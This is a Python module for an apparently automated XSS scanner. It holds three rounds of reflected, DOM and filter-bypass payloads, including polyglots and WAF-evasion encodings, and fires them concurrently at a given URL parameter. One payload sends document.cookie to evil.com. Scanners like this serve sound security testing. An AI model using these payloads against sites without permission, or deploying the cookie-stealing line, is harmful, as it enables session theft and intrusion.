"""Skill: test_xss — reflected, stored, and DOM-based XSS testing."""
from __future__ import annotations
import asyncio
import logging
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

XSS_PAYLOADS: list[dict[str, str]] = [
    {"payload": "<script>alert(1)</script>", "context": "basic"},
    {"payload": "<img src=x onerror=alert(1)>", "context": "event"},
    {"payload": "<svg/onload=alert(1)>", "context": "svg"},
    {"payload": "\"><script>alert(1)</script>", "context": "attribute_break"},
    {"payload": "javascript:alert(1)", "context": "proto"},
    {"payload": "<body onload=alert(1)>", "context": "event"},
    {"payload": "<input onfocus=alert(1) autofocus>", "context": "event"},
    {"payload": "<details open ontoggle=alert(1)>", "context": "event"},
    {"payload": "<marquee onstart=alert(1)>", "context": "event"},
    {"payload": "'-alert(1)-'", "context": "js_string"},
    {"payload": "`;alert(1)//", "context": "template_literal"},
    {"payload": "${alert(1)}", "context": "template_literal"},
    {"payload": "<iframe src=javascript:alert(1)>", "context": "iframe"},
    {"payload": "<a href=javascript:alert(1)>click</a>", "context": "href"},
    {"payload": "<div style=background:url(javascript:alert(1))>", "context": "css"},
    {"payload": "'><img src=x onerror=alert(1)>", "context": "attribute_break"},
    {"payload": "<script>fetch('http://evil.com/'+document.cookie)</script>", "context": "exfil"},
    {"payload": "<svg><script>alert(1)</script></svg>", "context": "svg_script"},
    {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "context": "encoded"},
    {"payload": "<math><mi><mglyph><svg><mtext><textarea><path id=x onerror=alert(1)>", "context": "mxss"},
    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
]

# Round 2 — filter bypass (case mixing, whitespace tricks, alt syntaxes).
# Most simple WAFs block `<script>` but miss these.
XSS_PAYLOADS_ROUND2: list[dict[str, str]] = [
    {"payload": "<ScRiPt>alert(1)</sCrIpT>", "context": "case_mix"},
    {"payload": "<script >alert(1)</script >", "context": "whitespace"},
    {"payload": "<script\t>alert(1)</script>", "context": "tab_split"},
    {"payload": "<script\n>alert(1)</script>", "context": "newline_split"},
    {"payload": "<<script>alert(1);//<</script>", "context": "double_bracket"},
    {"payload": "<scr<script>ipt>alert(1)</script>", "context": "nested_filter_bypass"},
    {"payload": "<img src=\"x\" onerror=\"alert&#40;1&#41;\">", "context": "entity_encoded"},
    {"payload": "<img src=x onerror=&#97;lert(1)>", "context": "html_entity_fn"},
    {"payload": "<IMG SRC=\"javascript:alert('XSS');\">", "context": "proto_upper"},
    {"payload": "<img src=javascript:alert(1)>", "context": "no_quotes"},
    {"payload": "<svg><animate onbegin=alert(1) attributeName=x>", "context": "svg_animate"},
    {"payload": "<video><source onerror=alert(1)>", "context": "video"},
    {"payload": "<audio src=x onerror=alert(1)>", "context": "audio"},
    {"payload": "<keygen autofocus onfocus=alert(1)>", "context": "keygen"},
    {"payload": "<isindex type=image src=x onerror=alert(1)>", "context": "isindex"},
    {"payload": "<object data=\"data:text/html,<script>alert(1)</script>\">", "context": "data_url"},
    {"payload": "<embed src=\"data:text/html,<script>alert(1)</script>\">", "context": "embed"},
    {"payload": "<form><button formaction=javascript:alert(1)>X</button>", "context": "formaction"},
    {"payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text>click</text></a>", "context": "xlink"},
    {"payload": "<iframe srcdoc=\"<script>alert(1)</script>\">", "context": "srcdoc"},
]

# Round 3 — polyglots + DOM-XSS + WAF evasion via encoding.
# Brutal last-resort payloads; some trigger in multiple contexts at once.
XSS_PAYLOADS_ROUND3: list[dict[str, str]] = [
    # The classic 0xsobky polyglot — fires in script, attribute, URL, and style contexts
    {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "context": "polyglot_0xsobky"},
    {"payload": "\"'--></style></script><svg onload=alert(1)>", "context": "polyglot_break"},
    {"payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "context": "polyglot_rsnake"},
    # DOM-XSS hooks
    {"payload": "#<script>alert(1)</script>", "context": "dom_hash"},
    {"payload": "#<img src=x onerror=alert(1)>", "context": "dom_hash_img"},
    {"payload": "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>", "context": "dom_js_proto"},
    # Base64 in data URL
    {"payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "context": "data_base64"},
    # Double-URL encoded
    {"payload": "%253Cscript%253Ealert(1)%253C/script%253E", "context": "double_urlencoded"},
    # Unicode-escaped
    {"payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "context": "unicode_escaped"},
    # HTML5-only
    {"payload": "<x contenteditable onbeforeinput=alert(1)>x", "context": "html5_beforeinput"},
    {"payload": "<x oncut=alert(1)>x", "context": "html5_oncut"},
    # SVG use element + xlink to external
    {"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>", "context": "svg_use_ext"},
    # Mutation-XSS
    {"payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "context": "mxss_noscript"},
    {"payload": "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>", "context": "mxss_listing"},
    # CSS-based XSS (IE/legacy, but still useful for stored contexts)
    {"payload": "<style>@import'javascript:alert(1)';</style>", "context": "css_import"},
    {"payload": "<style>*{x:expression(alert(1))}</style>", "context": "css_expression"},
]


def _xss_payloads_for_round(r: int) -> list[dict[str, str]]:
    """Select XSS payload set by rotation round.
    1 = classic, 2 = filter bypass, 3 = polyglot/DOM/WAF evasion,
    else = all combined (exhaustive, use sparingly).
    """
    if r == 1:
        return XSS_PAYLOADS
    if r == 2:
        return XSS_PAYLOADS_ROUND2
    if r == 3:
        return XSS_PAYLOADS_ROUND3
    return XSS_PAYLOADS + XSS_PAYLOADS_ROUND2 + XSS_PAYLOADS_ROUND3


async def execute(url: str, param_name: str | None = None, round: int = 1,
                  **kwargs: Any) -> dict[str, Any]:
    """Test XSS on a URL with query parameter.

    `round` (1|2|3) selects the payload set — scan_loop passes
    incrementing rounds when re-queueing the skill against the same
    URL so the second pass tests filter-bypass payloads instead of
    the same classic ones.

    Returns:
        {"vulnerable": bool, "findings": [...], "tested": int, "url": str, "round": int}
    """
    import httpx
    _payloads = _xss_payloads_for_round(round)

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param_name and param_name in params:
        target_param = param_name
    elif params:
        target_param = list(params.keys())[0]
    else:
        target_param = "q"
        params = {"q": [""]}
        parsed = parsed._replace(query="q=")

    findings: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        try:
            base_r = await client.get(url)
            baseline_body = base_r.text.lower()
        except Exception as e:
            return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}

        async def test_payload(p: dict[str, str]) -> None:
            nonlocal tested
            async with sem:
                tested += 1
                new_params = dict(params)
                orig = new_params[target_param][0] if new_params[target_param] else ""
                new_params[target_param] = [orig + p["payload"]]
                query = urlencode({k: v[0] for k, v in new_params.items()})
                test_url = urlunparse(parsed._replace(query=query))

                try:
                    r = await client.get(test_url, timeout=10)
                except Exception:
                    return

                body = r.text
                # Check if payload reflected unescaped
                if p["payload"].lower() in body.lower():
                    findings.append({
                        "type": f"xss_{p['context']}",
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": f"Payload reflected unescaped in response (status {r.status_code})",
                        "response_preview": body[:300],
                        "severity": "high",
                    })
                    logger.info("XSS found: %s on param %s", p["context"], target_param)

        await asyncio.gather(*[test_payload(p) for p in _payloads])

    # Deduplicate by context
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for f in findings:
        key = f"{f['type']}:{f['param']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return {"vulnerable": len(unique) > 0, "findings": unique, "tested": tested,
            "url": url, "param": target_param, "round": round}
